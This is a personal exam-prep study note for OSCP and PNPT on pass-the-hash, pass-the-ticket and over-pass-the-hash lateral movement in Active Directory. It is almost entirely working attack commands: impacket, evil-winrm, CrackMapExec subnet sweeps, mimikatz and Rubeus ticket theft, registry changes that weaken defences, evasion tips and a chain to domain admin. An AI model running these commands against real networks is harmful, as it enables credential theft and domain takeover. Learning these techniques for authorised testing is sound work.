---
tags: [oscp-journey, spectre, stage-3, pnpt, active-directory, pass-the-hash, pass-the-ticket, lateral-movement]
module: 3
cert-stage: pnpt
difficulty: intermediate
date: 2026-04-08
phantom-refs: ["PHANTOM/MODULE 4 — Active Directory/04.3 — Lateral Movement"]
netgod-refs: []
---

# S3-07 — Pass-the-Hash and Pass-the-Ticket

> [!info] Relationship to PHANTOM
> Full lateral movement content exists in [[PHANTOM/MODULE 4 — Active Directory/04.3 — Lateral Movement]]. This note adds PNPT/OSCP exam context, exact tool commands for every scenario, and the decision tree for which technique to use when.

---

## The Core Concept — Why Hashes Are As Good As Passwords

NTLM authentication never sends the cleartext password over the network. It sends a hash-based response to a challenge. The protocol was designed so that if you know a user's NT hash, you can authenticate as them — without ever knowing the plaintext password.

This is not a bug. It was a design decision. The consequence: **any stolen NT hash is immediately usable for authentication**. You don't need to crack it.

**Pass-the-Hash (PTH):** Use an NT hash to authenticate to services that use NTLM — SMB, WinRM, RDP (restricted admin mode), LDAP.

**Pass-the-Ticket (PTT):** Use a stolen Kerberos ticket (TGT or TGS) to authenticate to services that use Kerberos.

---

## Pass-the-Hash — Complete Reference

### When to Use PTH

- You have an NT hash from secretsdump, SAM dump, LSASS dump, or mimikatz
- You cannot or don't want to crack the hash
- The target service accepts NTLM authentication (SMB, WinRM, RDP restricted admin)
- The account has local admin rights on the target

### What PTH Works Against

| Protocol | Tool | Notes |
|---------|------|-------|
| SMB | impacket-psexec, impacket-wmiexec, impacket-smbexec, CME | Most common |
| WinRM | evil-winrm | Requires WinRM enabled |
| RDP | xfreerdp with `/pth:` | Requires Restricted Admin Mode enabled |
| LDAP | ldapsearch with hash | Limited use |
| MSSQL | impacket-mssqlclient | Service must accept Windows auth |

### What PTH Does NOT Work Against

- Kerberos-only services (when NTLMv2 is fully disabled)
- Protected Users group members (domain accounts in this group cannot use NTLM)
- Systems with Credential Guard enabled
- Remote UAC filtering on local accounts (local Admin hash works, but not other local accounts by default — needs `LocalAccountTokenFilterPolicy=1`)

### Hash Format

The hash used in PTH is the **NT hash** (second half of the LM:NT pair):

```
From secretsdump output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
                  └── LM hash (ignore this)            └── NT hash (USE THIS)

The format for tools: LM_HASH:NT_HASH or just :NT_HASH
:8846f7eaee8fb117ad06bdd830b7586c  (colon prefix means empty LM)
aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c  (full format)
```

`aad3b435b51404eeaad3b435b51404ee` is the LM hash for an empty string — it's always the same and means there's no LM hash. You can use it as-is or just prefix with `:`.

---

### impacket-psexec — SYSTEM Shell via SMB

psexec uploads a service binary to the target, creates a service, and executes it. Gives SYSTEM-level shell.

```bash
# With password:
impacket-psexec domain/Administrator:password@TARGET

# With hash (LM:NT format):
impacket-psexec domain/Administrator@TARGET -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# With hash (shorthand — empty LM):
impacket-psexec domain/Administrator@TARGET -hashes :8846f7eaee8fb117ad06bdd830b7586c

# Local admin (not domain account):
impacket-psexec ./Administrator@TARGET -hashes :NTLM_HASH
# ./ prefix = local account

# Specify a command to run instead of shell:
impacket-psexec domain/Administrator@TARGET -hashes :NTLM_HASH "whoami"

# Additional flags:
# -port PORT        = non-standard SMB port
# -service-name     = custom service name (for evasion)
# -codec            = encoding for output
```

**What psexec does under the hood:**
1. Authenticates to SMB with the provided hash
2. Uploads a random-named binary to `C:\Windows\`
3. Creates and starts a Windows service using that binary
4. Connects via named pipe `\\TARGET\PIPE\svcctl`
5. Provides an interactive shell running as SYSTEM

**Detection note:** psexec creates a new service and writes a binary to disk — high-visibility in logs (Event ID 7045: new service installed). Noisiest of the impacket tools.

---

### impacket-wmiexec — Admin Shell via WMI

wmiexec uses Windows Management Instrumentation to execute commands. Quieter than psexec — no service creation, no binary on disk.

```bash
# With password:
impacket-wmiexec domain/Administrator:password@TARGET

# With hash:
impacket-wmiexec domain/Administrator@TARGET -hashes :NTLM_HASH

# Local account:
impacket-wmiexec ./Administrator@TARGET -hashes :NTLM_HASH

# Execute single command:
impacket-wmiexec domain/Administrator@TARGET -hashes :NTLM_HASH -command "whoami"

# Non-interactive (just run command, no shell):
impacket-wmiexec domain/Administrator@TARGET -hashes :NTLM_HASH "ipconfig /all"
```

**Shell level:** Runs as the authenticated user (Administrator) — not SYSTEM like psexec. Still full admin rights.

**Detection:** Lower profile than psexec. Uses WMI service (always running). No new service created. Still generates WMI event logs.

---

### impacket-smbexec — Shell via SMB Service

smbexec creates a service (like psexec) but executes commands through it differently — writes output to a file and reads it back. Slightly different evasion profile.

```bash
impacket-smbexec domain/Administrator:password@TARGET
impacket-smbexec domain/Administrator@TARGET -hashes :NTLM_HASH
impacket-smbexec ./Administrator@TARGET -hashes :NTLM_HASH
```

---

### evil-winrm — WinRM Shell (Best Interactive Experience)

evil-winrm provides a fully interactive PowerShell shell over WinRM. Best UX of all the tools — supports file upload/download, script loading, and pass-the-hash.

```bash
# With password:
evil-winrm -i TARGET -u Administrator -p password

# With NT hash (JUST the NT hash — no LM prefix needed):
evil-winrm -i TARGET -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# With domain account:
evil-winrm -i TARGET -u domain\\Administrator -H NTLM_HASH

# SSL (port 5986):
evil-winrm -i TARGET -u Administrator -p password -S

# Load PowerShell scripts on connect:
evil-winrm -i TARGET -u Administrator -H HASH -s /path/to/ps_scripts/

# Upload files:
evil-winrm -i TARGET -u Administrator -H HASH
# Inside session:
upload /local/path/tool.exe
download C:\remote\file.txt /local/path/

# Execute .NET assemblies in memory:
# Inside session:
Invoke-Binary /local/SharpHound.exe
```

**Requirement:** WinRM must be enabled on the target (port 5985 or 5986). Check with:
```bash
crackmapexec winrm TARGET -u admin -H NTLM_HASH
# [+] = WinRM is open and credentials are valid
```

---

### CrackMapExec PTH — At Scale

```bash
# Test hash against single target:
crackmapexec smb TARGET -u Administrator -H NTLM_HASH

# Test across subnet — find where hash works:
crackmapexec smb 192.168.0.0/24 -u Administrator -H NTLM_HASH --local-auth --continue-on-success
# --local-auth = try as local account (not domain account)
# (Pwn3d!) = local admin on that machine

# Domain account PTH across subnet:
crackmapexec smb 192.168.0.0/24 -u Administrator -H NTLM_HASH --continue-on-success

# Execute command via PTH:
crackmapexec smb TARGET -u Administrator -H NTLM_HASH -x "whoami"
crackmapexec smb TARGET -u Administrator -H NTLM_HASH -X "Get-Process"  # PowerShell

# Dump SAM via PTH (requires local admin):
crackmapexec smb TARGET -u Administrator -H NTLM_HASH --sam

# WinRM PTH:
crackmapexec winrm TARGET -u Administrator -H NTLM_HASH -x "whoami"
```

---

### xfreerdp PTH — RDP with Hash

Requires Restricted Admin Mode to be enabled on the target (disabled by default on modern Windows, but sometimes enabled for administrative convenience).

```bash
# PTH via RDP:
xfreerdp /u:Administrator /pth:NTLM_HASH /v:TARGET

# Enable restricted admin mode first (if you already have admin access):
# On target:
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0

# Then PTH works:
xfreerdp /u:Administrator /pth:NTLM_HASH /v:TARGET /cert-ignore
```

---

### Local Admin Hash — The "Gotcha"

By default, Windows Remote UAC filters connections from local Administrator accounts (not domain accounts) when connecting via SMB from a remote machine. The `Administrator` account (RID 500) is an exception — it always works. But other local admin accounts (RID 1001+) are filtered.

To enable PTH for non-RID-500 local accounts:
```cmd
# On the target (requires admin):
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

**OSCP implication:** If you have a local hash that isn't the built-in Administrator (RID 500), and PTH is failing, this registry key may be the reason. The RID-500 Administrator always bypasses this.

---

## Pass-the-Ticket — Complete Reference

### How Kerberos Tickets Work

Kerberos tickets (TGTs and TGSs) are stored in memory on Windows machines. If you have SYSTEM or SeDebugPrivilege on a machine, you can extract these tickets and use them on another machine — impersonating the user they belong to without knowing their password.

**TGT (Ticket Granting Ticket):**
- Proves your identity to the KDC
- Encrypted with the krbtgt hash
- Valid for 10 hours by default (renewable up to 7 days)
- If you steal a DA's TGT, you can act as that DA for up to 10 hours

**TGS (Ticket Granting Service):**
- Authorises access to a specific service
- Encrypted with the service account's hash
- Valid for typically 10 hours
- More limited — only works for the specific service it was issued for

### Extracting Tickets — Mimikatz

```cmd
# In a mimikatz session (requires SYSTEM or SeDebugPrivilege):
privilege::debug
sekurlsa::tickets /export
# Exports all tickets to .kirbi files in current directory
# Look for: [0;XXXXX]-2-0-40e10000-Administrator@krbtgt-DOMAIN.LOCAL.kirbi (TGT)
# TGTs are the valuable ones — import and use them

# List tickets without exporting:
sekurlsa::tickets

# Import a ticket into the current session:
kerberos::ptt ticket.kirbi

# Verify the ticket is loaded:
klist
```

### Extracting Tickets — Rubeus

```powershell
# Dump all tickets from memory:
.\Rubeus.exe dump /nowrap

# Dump tickets for a specific LUID (session):
.\Rubeus.exe dump /luid:0x3e4 /nowrap

# Import ticket from base64 (from Rubeus dump output):
.\Rubeus.exe ptt /ticket:BASE64_ENCODED_TICKET

# Import from .kirbi file:
.\Rubeus.exe ptt /ticket:C:\Temp\ticket.kirbi

# Verify tickets in current session:
.\Rubeus.exe triage
klist
```

### Extracting Tickets — From Kali

If you have an NTLM hash or password and want a TGT without touching the target:

```bash
# Get a TGT using a hash (no need to log on to the machine):
impacket-getTGT domain.local/Administrator -hashes :NTLM_HASH -dc-ip DC_IP

# Get a TGT using a password:
impacket-getTGT domain.local/Administrator:password -dc-ip DC_IP

# Output: Administrator.ccache (credential cache file)

# Set the environment variable for impacket tools to use:
export KRB5CCNAME=Administrator.ccache

# Now use impacket tools with Kerberos auth (no password/hash needed):
impacket-psexec -k -no-pass domain/Administrator@TARGET
impacket-wmiexec -k -no-pass domain/Administrator@TARGET
impacket-secretsdump -k -no-pass domain/Administrator@DC_IP
```

### Using Tickets from Kali — The KRB5CCNAME Pattern

```bash
# Step 1 — Get or import a ticket:
impacket-getTGT domain.local/Administrator -hashes :NTLM_HASH -dc-ip DC_IP
# Creates: Administrator.ccache

# Step 2 — Set the environment variable:
export KRB5CCNAME=$(pwd)/Administrator.ccache

# Step 3 — Use any impacket tool with -k -no-pass:
impacket-psexec -k -no-pass domain.local/Administrator@dc01.domain.local
impacket-wmiexec -k -no-pass domain.local/Administrator@TARGET
impacket-smbclient -k -no-pass domain.local/Administrator@TARGET
impacket-secretsdump -k -no-pass domain.local/Administrator@DC_IP

# Important: use HOSTNAME not IP for Kerberos (Kerberos validates hostnames)
# Add to /etc/hosts if needed:
echo "DC_IP dc01.domain.local domain.local" >> /etc/hosts
```

### Converting Between Ticket Formats

Mimikatz exports .kirbi (Windows format). Impacket uses .ccache (Linux format). Convert between them:

```bash
# .kirbi → .ccache (for Kali use):
impacket-ticketConverter ticket.kirbi ticket.ccache

# .ccache → .kirbi (for Windows use):
impacket-ticketConverter ticket.ccache ticket.kirbi

# Base64 encoded ticket (from Rubeus) → .ccache:
# Decode base64 first:
echo "BASE64_TICKET" | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
```

---

## Over-Pass-the-Hash (Pass-the-Key)

This technique uses the NT hash to request a Kerberos TGT — combining aspects of both PTH and PTT.

```bash
# Using impacket:
impacket-getTGT domain.local/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# Using Rubeus (on Windows):
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /domain:domain.local /dc:DC_IP /ptt
# /ptt = pass the ticket (import into current session immediately)

# Using mimikatz (on Windows):
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLM_HASH /run:cmd.exe
# Opens a new cmd.exe with the Administrator's Kerberos context
```

**Why use this over PTH?**
- Generates a Kerberos TGT — works against services that don't accept NTLM
- Bypasses environments that have NTLM disabled
- Results in a real Kerberos ticket that lasts 10 hours

---

## The Lateral Movement Decision Tree

Use this to choose the right technique for each scenario:

```
Do you have an NT hash?
├── YES
│   ├── Target accepts NTLM (most cases)
│   │   ├── Want a shell? → impacket-psexec (SYSTEM) or evil-winrm (admin)
│   │   ├── Want quiet exec? → impacket-wmiexec
│   │   └── Want to sweep the network? → crackmapexec smb SUBNET -u user -H HASH
│   └── Target has NTLM disabled (Kerberos only)
│       └── Over-Pass-the-Hash → impacket-getTGT → export KRB5CCNAME → use -k
│
Do you have a Kerberos ticket (.kirbi or .ccache)?
├── YES
│   ├── On Windows? → Rubeus ptt or mimikatz kerberos::ptt
│   └── On Kali? → export KRB5CCNAME → use impacket with -k -no-pass
│
Do you have a cleartext password?
├── YES → Just use it directly — no special technique needed
│
Do you have neither hash nor ticket nor password?
└── Go back to enumeration → LLMNR → relay → Kerberoast → spray
```

---

## OSCP and PNPT Exam Context

**PNPT:** PTH is a core skill. The 5-day exam almost certainly requires lateral movement from Client → Server using captured hashes. Practice the full chain: compromise machine → secretsdump → PTH to next machine.

**OSCP:** PTH is fully allowed — no restrictions. impacket tools are all permitted. The AD set (40 points) typically requires PTH for lateral movement between machines.

**Specific OSCP AD chain pattern:**
```
1. Compromise Client via web/service vuln
2. Escalate to admin/SYSTEM on Client
3. secretsdump Client → get domain account hashes
4. PTH to Server using domain account hash
5. secretsdump Server → get DA credentials
6. PTH to DC → secretsdump all hashes → get root.txt
```

**Time budget:**
- secretsdump: 30 seconds
- PTH attempt (psexec/evil-winrm): 1 minute
- CME sweep to find where hash works: 2 minutes
- Total PTH phase: < 5 minutes if hash is valid

---

## Quick Reference

```bash
# PTH — psexec (SYSTEM shell):
impacket-psexec domain/Administrator@TARGET -hashes :NTLM_HASH

# PTH — wmiexec (Admin shell, quieter):
impacket-wmiexec domain/Administrator@TARGET -hashes :NTLM_HASH

# PTH — evil-winrm (WinRM):
evil-winrm -i TARGET -u Administrator -H NTLM_HASH

# PTH — CME sweep (find where hash works):
crackmapexec smb 192.168.0.0/24 -u Administrator -H NTLM_HASH --continue-on-success

# PTH — CME local admin sweep:
crackmapexec smb 192.168.0.0/24 -u Administrator -H NTLM_HASH --local-auth --continue-on-success

# PTH — RDP (needs restricted admin mode):
xfreerdp /u:Administrator /pth:NTLM_HASH /v:TARGET /cert-ignore

# PTT — get TGT from hash (Kali):
impacket-getTGT domain.local/user -hashes :NTLM_HASH -dc-ip DC_IP
export KRB5CCNAME=user.ccache

# PTT — use ticket with impacket:
impacket-psexec -k -no-pass domain.local/user@hostname.domain.local

# PTT — dump tickets (mimikatz):
sekurlsa::tickets /export

# PTT — import ticket (mimikatz):
kerberos::ptt ticket.kirbi

# PTT — Rubeus dump:
.\Rubeus.exe dump /nowrap

# PTT — Rubeus import:
.\Rubeus.exe ptt /ticket:BASE64

# Convert ticket formats:
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi

# Over-PTH (hash → Kerberos TGT):
.\Rubeus.exe asktgt /user:Administrator /rc4:NTLM_HASH /domain:domain.local /ptt
```

---

## Common Mistakes

> [!warning] PTH and PTT mistakes that cause silent failures
> 1. **Using IP instead of hostname for Kerberos operations.** Kerberos validates the SPN against hostnames — not IPs. If you use `-k -no-pass` with an IP address, authentication fails silently. Always add the hostname to `/etc/hosts` and use it.
> 2. **Using the wrong hash format for evil-winrm.** evil-winrm takes just the NT hash (no `LM:NT` prefix). Other tools take `LM:NT` or `:NT`. Read the flag descriptions.
> 3. **Not exporting KRB5CCNAME.** If you run impacket-getTGT and then run impacket-psexec without exporting the variable, impacket won't find the ticket. Always `export KRB5CCNAME=path/to/file.ccache` immediately after getting the ticket.
> 4. **PTH failing due to Remote UAC.** Non-RID-500 local accounts are filtered by default. If your hash is for a local user who isn't the built-in Administrator, PTH will fail with "access denied" even with valid credentials. Either use the RID-500 account or enable LocalAccountTokenFilterPolicy on the target.
> 5. **Trying to PTT an expired ticket.** TGTs are valid for 10 hours. If the ticket is from a compromised machine that's been off for 12 hours, it's expired. Request a fresh one.
> 6. **Using psexec when WinRM is available.** psexec is noisy (writes binary to disk, creates service). If WinRM is open, use evil-winrm — same access level, much quieter, better UX.

---

## Practice Resources

| Resource | What to do |
|----------|-----------|
| TryHackMe — "Post-Exploitation Basics" | PTH with Metasploit incognito + mimikatz |
| TryHackMe — "Lateral Movement and Pivoting" | Full PTH and PTT labs |
| HTB — Forest | Full PTH chain after DCSync |
| HTB — Sauna | secretsdump → PTH to DA |
| HTB — Monteverde | Credential chain leading to PTH |
| TCM Security — PEH Course | Full PTH demo with impacket + CME |
| impacket examples | `impacket-psexec -h`, `impacket-wmiexec -h` — read all flags |
| [[PHANTOM/MODULE 4 — Active Directory/04.3 — Lateral Movement]] | Full technical depth in PHANTOM vault |
